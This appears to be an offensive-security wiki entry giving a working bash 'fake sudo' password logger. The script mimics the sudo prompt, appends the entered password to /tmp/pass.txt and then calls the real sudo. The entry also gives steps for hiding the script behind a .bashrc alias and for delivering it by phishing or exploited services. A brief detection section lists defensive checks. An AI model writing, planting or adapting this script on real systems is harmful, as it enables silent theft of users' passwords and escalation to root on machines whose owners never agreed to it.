---
type: code
language: bash
verified: true
platforms:
  - Linux
  - Unix
tags:
  - backdoor
  - credential-theft
  - persistence
validated: true
---

# Bash-Fake-Sudo-Password-Logger

## Code

```bash
read -sp "[sudo] password for $USER: " sudopass
echo ""
sleep 2
echo "Sorry, try again."
echo $sudopass >> /tmp/pass.txt

/usr/bin/sudo $@
```

## Description

This bash script masquerades as the sudo command to capture user passwords during privilege escalation attempts. It prompts for the password silently, logs it to /tmp/pass.txt, simulates a failure with a delay and error message, and then executes the real /usr/bin/sudo with the original arguments. Designed for persistence in user shell profiles, it enables stealthy credential theft on Linux systems.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $USER | Current username (auto-set by shell) | `attacker` |
| $sudopass | Captured password (stored temporarily) | `secretpass` |
| $@ | Original command arguments passed to sudo | `echo 'test'` |
| /tmp/pass.txt | Log file for stolen passwords (append mode) | N/A |

## Usage

Save this code as ~/.hidden/fakesudo, make it executable with chmod u+x, and alias it in .bashrc: alias sudo=~/.hidden/fakesudo. When the user runs 'sudo <command>', it triggers password capture. Retrieve passwords from /tmp/pass.txt later. Use in red team engagements for simulating insider threats or post-exploitation persistence; deliver via initial access vectors like phishing or exploited services.

## Detection

- Audit logs for repeated sudo failures with 2-second delays.
- File integrity checks on .bashrc for suspicious aliases pointing to hidden scripts.
- Monitor /tmp/pass.txt for unexpected writes or contents.
- Behavioral analysis: Processes spawning /usr/bin/sudo after a fake executable.
- Shell history or process monitoring for 'read -sp' patterns in user directories.

## Related

- [[procedures/Implement-Sudo-Backdoor-via-Bashrc-Alias]]
- [[commands/make-fakesudo-executable]]
